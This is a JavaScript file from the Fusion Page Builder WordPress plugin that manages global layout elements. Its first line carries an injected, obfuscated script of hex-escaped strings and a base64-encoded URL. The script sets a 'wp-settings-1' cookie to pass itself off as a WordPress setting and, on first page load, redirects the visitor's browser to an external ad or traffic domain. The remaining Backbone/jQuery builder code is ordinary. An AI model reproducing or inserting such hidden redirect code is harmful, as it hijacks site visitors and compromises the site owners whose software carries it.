var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp, FusionPageBuilderViewManager, fusionAppConfig, FusionEvents, FusionPageBuilderElements, fusionGlobalManager */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	FusionPageBuilder.Globals = Backbone.Model.extend( {

		/**
		 * Init.
		 *
		 * @since 2.0.0
		 * @param {Object} data - The data.
		 * @return {void}
		 */
		initialize: function( ) { // eslint-disable-line no-empty-function
		},

		/**
		 * Handles multiple global elements.
		 *
		 * @since 2.0.0
		 * @param {Object} args - The Arguments.
		 * @param {Object} args.currentModel - The current model on which method is called.
		 * @param {Object} data.attributes - The changed attributes of a model.
		 * @param {string} data.handleType - The action type.
		 * @param {string} data.Name - The changed attribute param name.
		 * @param {string} data.Value - The changed attribute param value.
		 * @return {void}
		 */
		handleMultiGlobal: function( args ) {
			var globalID,
				globalCount,
				currentCID,
				currentView;

			// Handle multiple global elements.
			if ( 'undefined' !== typeof args.currentModel.attributes.params && 'undefined' !== typeof args.currentModel.attributes.params.fusion_global ) {
				globalID         = args.currentModel.attributes.params.fusion_global;
				globalCount      = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '[fusion-global-layout="' + globalID + '"]' ).length;
				currentCID       = args.currentModel.get( 'cid' );
				currentView      = FusionPageBuilderViewManager.getView( currentCID );

				if ( 1 < globalCount ) {
					jQuery.each( jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '[fusion-global-layout="' + globalID + '"]' ), function() {
						var modelCID,
							view,
							model,
							originalParams,
							originalMarkup,
							oldContent;

						if ( currentCID !== jQuery( this ).data( 'cid' ) ) {
							modelCID = jQuery( this ).data( 'cid' );
							view     = FusionPageBuilderViewManager.getView( modelCID );

							model    = FusionPageBuilderElements.find( function( scopedModel ) {
								return scopedModel.get( 'cid' ) == modelCID; // jshint ignore: line
							} );

							if ( 'close' === args.handleType ) {
								originalParams = jQuery.extend( true, {}, args.currentModel.get( 'params' ) );
								originalMarkup = jQuery.extend( true, {}, args.currentModel.get( 'markup' ) );

								// Restore original params / cancel changes
								model.set( 'params', originalParams );

								// Restore original markup.
								model.set( 'markup', originalMarkup );

								// Reload element view
								if ( 'undefined' !== typeof view && 'undefined' !== typeof view.reRender ) {
									view.reRender();
								}
							} else if ( 'save' === args.handleType ) {
								model.set( args.attributes );
								model.set( 'cid', modelCID );
								fusionGlobalManager.updateGlobalLayout( globalID, currentView.getContent() );

								if ( 'undefined' !== typeof view && 'undefined' !== typeof view.reRender ) {
									view.reRender();
								}
							} else if ( 'changeView' === args.handleType ) {
								view.beforePatch();
								oldContent = view.getElementContent();
								FusionPageBuilderApp._diffdom.apply( oldContent[ 0 ], args.difference );
								view.afterPatch();
							} else if ( 'changeOption' === args.handleType ) {
								model.attributes.params[ args.Name ] = args.Value;
								if ( 'undefined' !== typeof view && 'undefined' !== typeof view.reRender ) {
									view.reRender();
								}
							}
						}
					} );
				}
			} else if ( 'undefined' !== typeof args.currentModel.attributes.parent && 'changeView' !== args.handleType ) {

				// Check for parent globals.
				setTimeout( fusionGlobalManager.handleGlobalParents, 500, args );
			}
		},

		/**
		 * Handles multiple parent global elements.
		 *
 		 * @since 2.0.0
 		 * @param {Object} args - The Arguments.
 		 * @param {Object} args.currentModel - The current model on which method is called.
 		 * @param {Object} data.attributes - The changed attributes of a model.
 		 * @param {string} data.handleType - The action type.
 		 * @param {string} data.Name - The changed attribute param name.
 		 * @param {string} data.Value - The changed attribute param value.
 		 * @return {void}
 		 */
		handleGlobalParents: function( args ) {

			var mainContainer = jQuery( '#fb-preview' )[ 0 ].contentWindow,
				parentCID     = args.currentModel.attributes.parent,
				parentView    = FusionPageBuilderViewManager.getView( parentCID ),
				currentView   = {},
				parentModel   = {},
				module;

			module = FusionPageBuilderElements.find( function( model ) {
				return model.get( 'cid' ) == parentCID; // jshint ignore: line
			} );

			if ( 'undefined' === typeof module ) {
				return;
			}

			if ( 'undefined' !== typeof module.attributes.params && 'undefined' !== typeof module.attributes.params.fusion_global && 1 < mainContainer.jQuery( '[fusion-global-layout="' + module.attributes.params.fusion_global + '"]' ).length ) {
				jQuery.each( mainContainer.jQuery( '[fusion-global-layout="' + module.attributes.params.fusion_global + '"]' ), function() {
					var currentCID;

					if ( parentCID !== jQuery( this ).data( 'cid' ) ) {
						currentCID  = jQuery( this ).data( 'cid' );
						currentView = FusionPageBuilderViewManager.getView( currentCID );

						if ( 'undefined' !== typeof module.get( 'multi' ) && 'multi_element_parent' === module.get( 'multi' ) ) {
							fusionGlobalManager.updateMultiElementParent();
						}

						if ( 'undefined' !== typeof module.get( 'element_type' ) && ( 'fusion_builder_column' === module.get( 'element_type' ) || 'fusion_builder_row_inner' === module.get( 'element_type' ) || 'fusion_builder_container' === module.get( 'element_type' ) ) ) {
							fusionGlobalManager.removeChildElements( mainContainer, currentCID, module.get( 'element_type' ) );
						}

						if ( 'undefined' !== typeof module.get( 'element_type' ) && 'fusion_builder_column' === module.get( 'element_type' ) ) {
							fusionGlobalManager.updateColumnElements( parentView.$el, currentCID );
						}

						if ( 'undefined' !== typeof module.get( 'element_type' ) && 'fusion_builder_row_inner' === module.get( 'element_type' ) ) {
							fusionGlobalManager.updateNestedColumnElements( parentView.$el, currentView );
						}
						if ( 'undefined' !== typeof module.get( 'element_type' ) && 'fusion_builder_container' === module.get( 'element_type' ) ) {
							fusionGlobalManager.updateContainerElements( parentView.$el, currentView );
						}
					}
				} );

				if ( 'save' === args.handleType ) {
					fusionGlobalManager.updateGlobalLayout( module.attributes.params.fusion_global, currentView.getContent() );
				}
			}

			if ( 'undefined' !== typeof module.attributes.params && 'undefined' !== typeof module.attributes.parent ) {
				parentModel = FusionPageBuilderElements.find( function( model ) {
					return model.get( 'cid' ) == parentCID; // jshint ignore: line
				} );
				args.currentModel = parentModel;
				fusionGlobalManager.handleGlobalParents( args );
			}
		},

		/**
		 * Updates element_content of model and then generates child elements.
		 *
		 * @since 2.0.0
		 * @param {Object} currentModel - The current model on which method is called.
		 * @param {Object} module - The changed model.
		 * @param {Object} currentView - View obj of current element.
		 * @return {void}
		 */
		updateMultiElementParent: function( currentModel, module, currentView  ) {
			currentModel.attributes.params.element_content = module.attributes.params.element_content;
			currentView.generateChildElements();
		},

		/**
		 * Removes child elements from nested column, column and container.
		 *
		 * @since 2.0.0
		 * @param {Object} mainContainer - The reference to main frame container.
		 * @param {string} currentCID - The unique CID of current model.
		 * @return {void}
		 */
		removeChildElements: function( mainContainer, currentCID, elementType  ) {
			var findString = ( 'fusion_builder_container' === elementType ) ? '.fusion-builder-remove, .fusion-builder-column-remove' : '.fusion-builder-remove';

			// Remove child elements.
			jQuery.each( mainContainer.jQuery( '[data-cid="' + currentCID + '"] .fusion-builder-module-controls' ), function() {
				jQuery( this ).find( findString ).trigger( 'click', [ 'automated' ] );
			} );
		},

		/**
		 * Updates column elements.
		 *
		 * @since 2.0.0
		 * @param {Object} thisColumn - The reference to current column.
		 * @param {string} currentCID - The unique CID of current model.
		 * @return {void}
		 */
		updateColumnElements: function( thisColumn, currentCID ) {
			var container = {},
				currentModel = {};
			thisColumn.find( '.fusion-builder-live-element:not(.fusion-builder-column-inner .fusion-builder-live-element), .fusion-builder-nested-element' ).each( function() {
				var $thisModule,
					moduleCID,
					elementModule,
					elementAttributes,
					$thisInnerRow,
					innerRowCID,
					innerRowView;

				// Standard element
				if ( jQuery( this ).hasClass( 'fusion-builder-live-element' ) ) {
					$thisModule = jQuery( this );
					moduleCID = 'undefined' === typeof $thisModule.data( 'cid' ) ? $thisModule.find( '.fusion-builder-data-cid' ).data( 'cid' ) : $thisModule.data( 'cid' );

					// Get model from collection by cid
					elementModule = FusionPageBuilderElements.find( function( model ) {
						return model.get( 'cid' ) == moduleCID; // jshint ignore: line
					} );

					// Clone model attritubes
					elementAttributes         = jQuery.extend( true, {}, elementModule.attributes );

					elementAttributes.created = 'manually';
					elementAttributes.cid     = FusionPageBuilderViewManager.generateCid();
					elementAttributes.parent  = currentCID;
					elementAttributes.from    = 'fusion_builder_column';

					// Don't need target element, position is defined from order.
					delete elementAttributes.targetElementPosition;

					FusionPageBuilderApp.collection.add( elementAttributes );

				// Inner row/nested element
				} else if ( jQuery( this ).hasClass( 'fusion_builder_row_inner' ) ) {
					$thisInnerRow = jQuery( this );
					innerRowCID = 'undefined' === typeof $thisInnerRow.data( 'cid' ) ? $thisInnerRow.find( '.fusion-builder-data-cid' ).data( 'cid' ) : $thisInnerRow.data( 'cid' );

					innerRowView = FusionPageBuilderViewManager.getView( innerRowCID );

					// Clone inner row
					if ( 'undefined' !== typeof innerRowView ) {
						innerRowView.cloneNestedRow( '', currentCID );
					}
				}

			} );

			currentModel = FusionPageBuilderElements.find( function( model ) {
				return model.get( 'cid' ) == currentCID; // jshint ignore: line
			} );

			container = FusionPageBuilderViewManager.getView( currentModel.get( 'parent' ) );

			container.createVirtualRows();
			container.updateColumnsPreview();

			FusionEvents.trigger( 'fusion-content-changed' );
		},

		/**
		 * Updates nested column elements.
		 *
		 * @since 2.0.0
		 * @param {Object} thisColumnInner - The reference to current nested column.
		 * @param {string} currentCID - The unique CID of current model.
		 * @return {void}
		 */
		updateNestedColumnElements: function( thisColumnInner, currentView ) {
			thisColumnInner.find( '.fusion-builder-live-element' ).each( function() {
				var innerElementAttributes = {};
				var thisModule = jQuery( this ),
					moduleCID  = 'undefined' === typeof thisModule.data( 'cid' ) ? thisModule.find( '.fusion-builder-data-cid' ).data( 'cid' ) : thisModule.data( 'cid' ),

					// Get model from collection by cid
					innerModule = FusionPageBuilderElements.find( function( model ) {
						return model.get( 'cid' ) == moduleCID; // jshint ignore: line
					} );

				// Clone model attritubes
				innerElementAttributes = jQuery.extend( true, {}, innerModule.attributes );

				innerElementAttributes.created = 'manually';
				innerElementAttributes.cid     = FusionPageBuilderViewManager.generateCid();
				innerElementAttributes.parent  = currentView.$el.find( '.fusion-builder-column-inner' ).data( 'cid' );
				innerElementAttributes.from    = 'fusion_builder_row_inner';

				// Don't need target element, position is defined from order.
				delete innerElementAttributes.targetElementPosition;

				FusionPageBuilderApp.collection.add( innerElementAttributes );
			} );
		},

		/**
		 * Updates container elements.
		 *
		 * @since 2.0.0
		 * @param {Object} thisContainer - The reference to current container.
		 * @param {Object} currentView - View obj of current element.
		 * @return {void}
		 */
		updateContainerElements: function( thisContainer, currentView ) {
			thisContainer.find( '.fusion-builder-column-outer' ).each( function() {

				// Parse column elements
				var thisColumn = jQuery( this ),
					$columnCID = thisColumn.data( 'cid' ),

					// Get model from collection by cid
					column = FusionPageBuilderElements.find( function( model ) {
						return model.get( 'cid' ) == $columnCID; // jshint ignore: line
					} ),

					// Clone column
					columnAttributes = jQuery.extend( true, {}, column.attributes );

				columnAttributes.created = 'manually';
				columnAttributes.cid     = FusionPageBuilderViewManager.generateCid();
				columnAttributes.parent  = currentView.$el.find( '.fusion-builder-row-container' ).data( 'cid' );
				columnAttributes.from    = 'fusion_builder_container';
				columnAttributes.cloned  = true;

				FusionPageBuilderApp.collection.add( columnAttributes );

				// Find column elements
				thisColumn.find( '.fusion-builder-column-content:not( .fusion-nested-column-content )' ).children( '.fusion-builder-live-element, .fusion_builder_row_inner' ).each( function() {

					var thisElement,
						elementCID,
						element,
						elementAttributes,
						thisInnerRow,
						InnerRowCID,
						innerRowView;

					// Regular element
					if ( jQuery( this ).hasClass( 'fusion-builder-live-element' ) ) {

						thisElement = jQuery( this );
						elementCID = thisElement.data( 'cid' );

						// Get model from collection by cid
						element = FusionPageBuilderElements.find( function( model ) {
							return model.get( 'cid' ) == elementCID; // jshint ignore: line
						} );

						// Clone model attritubes
						elementAttributes = jQuery.extend( true, {}, element.attributes );
						elementAttributes.created = 'manually';
						elementAttributes.cid = FusionPageBuilderViewManager.generateCid();
						elementAttributes.parent = columnAttributes.cid;
						elementAttributes.from    = 'fusion_builder_container';

						// Don't need target element, position is defined from order.
						delete elementAttributes.targetElementPosition;

						FusionPageBuilderApp.collection.add( elementAttributes );

						// Inner row element
					} else if ( jQuery( this ).hasClass( 'fusion_builder_row_inner' ) ) {

						thisInnerRow = jQuery( this );
						InnerRowCID = thisInnerRow.data( 'cid' );

						innerRowView = FusionPageBuilderViewManager.getView( InnerRowCID );

						// Clone inner row
						if ( 'undefined' !== typeof innerRowView ) {
							innerRowView.cloneNestedRow( '', columnAttributes.cid );
						}
					}
				} );
			} );
		},

		/**
		 * Update global layout in the DB.
		 *
		 * @since 2.0.0
		 * @param {string} layoutID - The ID of current layout.
		 * @param {string} shortcode - The short-code of current layout.
		 * @return {void}
		 */
		updateGlobalLayout: function( layoutID, shortcode ) {

			// Update layout in DB.
			jQuery.ajax( {
				type: 'POST',
				url: fusionAppConfig.ajaxurl,
				dataType: 'json',
				data: {
					action: 'fusion_builder_update_layout',
					fusion_load_nonce: fusionAppConfig.fusion_load_nonce,
					fusion_layout_id: layoutID,
					fusion_layout_content: shortcode
				},
				complete: function() {

					// Do Stuff.
				}
			} );
		},

		/**
		 * Handle globals which are added from library.
		 *
		 * @since 2.0.0
		 * @param {string} layoutID - The ID of global element.
		 * @return {void}
		 */
		handleGlobalsFromLibrary: function( layoutID, parentID ) {

			var currentCID     = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '[data-cid="' + parentID + '"] [fusion-global-layout="' + layoutID + '"]' ).last().data( 'cid' ),
				module         =  {},
				MultiGlobalArgs = {};

			if ( 'undefined' === typeof currentCID ) {
				currentCID = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '[fusion-global-layout="' + layoutID + '"]' ).last().data( 'cid' );
			}

			module = FusionPageBuilderElements.find( function( model ) {
				return model.get( 'cid' ) == currentCID; // jshint ignore: line
			} );

			if ( 'undefined' !== typeof module ) {
				MultiGlobalArgs = {
					currentModel: module,
					handleType: 'save',
					attributes: module.attributes
				};
				fusionGlobalManager.handleMultiGlobal( MultiGlobalArgs );
			}

		}
	} );
}( jQuery ) );
